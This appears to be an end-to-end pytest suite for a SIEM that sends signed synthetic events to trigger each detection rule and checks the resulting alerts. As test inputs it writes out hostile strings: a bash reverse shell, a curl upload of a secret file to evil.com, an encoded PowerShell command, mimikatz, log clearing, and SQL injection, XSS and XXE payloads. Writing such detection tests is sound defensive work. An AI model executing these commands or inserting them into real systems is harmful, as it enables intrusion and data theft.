"""
Exhaustive Rule Testing Suite.
Validates EVERY dynamic and stateful rule defined in siem_catalog.py end-to-end.
"""
import asyncio
import os
import time
import httpx
import uuid
import pytest
from datetime import datetime, timezone
import hashlib
from ecdsa import SigningKey

from tests.test_grand_master_e2e import (
    _e2e_enabled,
    _now_iso,
    _authenticate_agent_client,
    API_BASE_URL,
    DEFAULT_TIMEOUT
)

from app.utils.siem_catalog import SIEM_RULES
from app.utils.agent_crypto import (
    build_event_signature_string,
    build_payload_hash,
    build_signable_event_payload,
)

def _http_event(event_id, event_uid, tenant_id, agent_id, message, source_ip, private_key_pem, user="SYSTEM"):
    event = {
        "event_uid": event_uid,
        "event_id": event_id,
        "tenant_id": tenant_id,
        "agent_id": agent_id,
        "source_ip": source_ip,
        "user": user,
        "message": message,
        "timestamp": _now_iso(),
        "raw_data": {"event_id": event_id, "source_ip": source_ip},
        "raw_event_data": {"event_id": event_id, "source_ip": source_ip},
        "processed_data": {},
        "agent_version": "grand-master-hammer",
    }
    signable = build_signable_event_payload(event)
    payload_hash = build_payload_hash(signable)
    canonical = build_event_signature_string(agent_id, event["timestamp"], event_uid, payload_hash)
    event["agent_signature"] = SigningKey.from_pem(private_key_pem).sign_deterministic(
        canonical.encode("utf-8"),
        hashfunc=hashlib.sha256,
    ).hex()
    return event

@pytest.mark.asyncio
@pytest.mark.skipif(not _e2e_enabled(), reason="Set E2E=1 to run the full end-to-end validation.")
async def test_all_catalog_rules_e2e(clean_slate, mock_tenant_a, mongo_client, redis_client):
    settings_db = mongo_client[os.getenv("MONGO_DB_NAME", "WarSOC_DB")]
    
    import subprocess
    # Restart workers to ensure they load the new mock_tenant_a config from the DB
    subprocess.run(["docker", "restart", "startup-backend-worker-siem-1", "startup-backend-worker-siem-2", "startup-backend-worker-siem-3", "warsoc-worker-fbr", "warsoc-worker-peca"], check=True)
    # Wait a bit for them to connect to Redis
    await asyncio.sleep(5)

    async with httpx.AsyncClient(base_url=API_BASE_URL, follow_redirects=True, timeout=DEFAULT_TIMEOUT, cookies=httpx.Cookies()) as client:
        await _authenticate_agent_client(client, mock_tenant_a["agent_jwt"])
        
        dynamic_rules = SIEM_RULES["detection"]["rules"]
        # Generate payloads for dynamic rules
        dynamic_events = []
        for rule_name, rule_config in dynamic_rules.items():
            # Create a string that matches the rule's requirements
            # We construct a generic string that contains required keywords to hit MANDATE 2
            message = ""
            if "must_include_any" in rule_config:
                message += rule_config["must_include_any"][0] + " "
            
            # Map rule to a specific message that matches its regex
            regex_matches = {
                "SQL_INJECTION": "union select * from users",
                "XSS_ATTACK": "<script>alert(1)</script>",
                "COMMAND_INJECTION": "; whoami",
                "PATH_TRAVERSAL": "../../../etc/passwd",
                "POWERSHELL_OBFUSCATION": "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA",
                "PRIVILEGE_ESCALATION": "sudo su -",
                "LATERAL_MOVEMENT": "net use \\\\192.168.1.10\\c$",
                "LOG_EVASION": "wevtutil cl system",
                "REVERSE_SHELL": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "RECON_COMMANDS": "whoami",
                "PERSISTENCE": "schtasks /create /tn persist",
                "DATA_EXFILTRATION": "curl -X POST -d @secret.txt http://evil.com",
                "STAGING": "tar -czf /tmp/data.tar.gz /sensitive",
                "BRUTE_FORCE_PATTERN": "failed password for root",
                "XXE_INJECTION": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
                "MALWARE_EXECUTION": "mimikatz.exe privilege::debug",
                "SIEM-FW-001": "firewall connection blocked 5156"
            }
            
            message += regex_matches.get(rule_name, rule_name)
            
            # Ensure it meets min length
            if "min_message_length" in rule_config:
                while len(message) < rule_config["min_message_length"]:
                    message += " padding"
                    
            dynamic_events.append(_http_event(
                event_id=1,
                event_uid=str(uuid.uuid4()),
                tenant_id=mock_tenant_a["tenant_id"],
                agent_id=mock_tenant_a["agent_id"],
                message=message,
                source_ip="10.50.60.70",
                private_key_pem=mock_tenant_a["private_key_pem"],
                user="attacker"
            ))

        # Send Dynamic Rule Events
        resp = await client.post(
            "/ingest/pulse",
            json={"nonce": uuid.uuid4().hex, "timestamp": int(time.time()), "payload": dynamic_events},
            timeout=10.0,
        )
        assert resp.status_code in (200, 202)

        # Now test some Stateful Rules (e.g., Phishing Kill Chain, Horizontal Port Scan)
        stateful_events = []
        
        # 1. Phishing Kill Chain (needs 2 stages)
        stateful_events.append(_http_event(2, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], "verify your account via http://evil.com", "10.0.0.99", mock_tenant_a["private_key_pem"], user="victim"))
        stateful_events.append(_http_event(3, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], "wscript.exe executed payload", "10.0.0.99", mock_tenant_a["private_key_pem"], user="victim"))
        
        # 2. Horizontal Port Scan (10 events, unique destination IP)
        for i in range(11):
            stateful_events.append(_http_event(5156, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], f"network connection to 192.168.1.{i}", "10.1.1.1", mock_tenant_a["private_key_pem"], user="scanner"))
            # Manipulate raw_event_data so SIEM logic parses it
            stateful_events[-1]["raw_data"]["destination_ip"] = f"192.168.1.{i}"

        # 3. Mass File Deletion (50 events)
        for i in range(51):
            stateful_events.append(_http_event(4660, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], f"deleted file_{i}.txt", "10.2.2.2", mock_tenant_a["private_key_pem"], user="deleter"))

        resp = await client.post(
            "/ingest/pulse",
            json={"nonce": uuid.uuid4().hex, "timestamp": int(time.time()), "payload": stateful_events},
            timeout=10.0,
        )
        assert resp.status_code in (200, 202)

        # Wait for workers to process everything
        await asyncio.sleep(20)
        
        # Validate Database
        print(f"DEBUG DB NAME: {settings_db.name}")
        total_alerts = await settings_db["security_alerts"].count_documents({"tenant_id": mock_tenant_a["tenant_id"]})
        all_alerts = await settings_db["security_alerts"].find({"tenant_id": mock_tenant_a["tenant_id"]}).to_list(None)
        print(f"DEBUG ALL ALERT TYPES: {[a.get('type') for a in all_alerts]}")
        
        # We should have at least 1 alert per dynamic rule, plus stateful alerts
        expected_minimum = len(dynamic_rules) + 3
        print(f"DEBUG TOTAL ALERTS FOUND: {total_alerts}")
        
        # Check specific stateful alerts
        phishing = await settings_db["security_alerts"].count_documents({"type": {"$regex": "phishing", "$options": "i"}})
        port_scan = await settings_db["security_alerts"].count_documents({"type": {"$regex": "scan", "$options": "i"}})
        deletion = await settings_db["security_alerts"].count_documents({"type": {"$regex": "deletion", "$options": "i"}})
        
        print(f"DEBUG STATS: phishing={phishing}, port_scan={port_scan}, deletion={deletion}")
        
        assert total_alerts >= expected_minimum, f"Expected at least {expected_minimum} alerts, got {total_alerts}"
        assert phishing >= 1, "Phishing Kill Chain failed"
        assert port_scan >= 1, "Horizontal Port Scan failed"
        assert deletion >= 1, "Mass File Deletion failed"

        # Check FBR routing (Event ID 4660 should route to fbr_pos_logs)
        fbr_logs = await settings_db["fbr_pos_logs"].count_documents({"tenant_id": mock_tenant_a["tenant_id"]})
        assert fbr_logs >= 51, f"Expected 51 FBR logs, got {fbr_logs}"
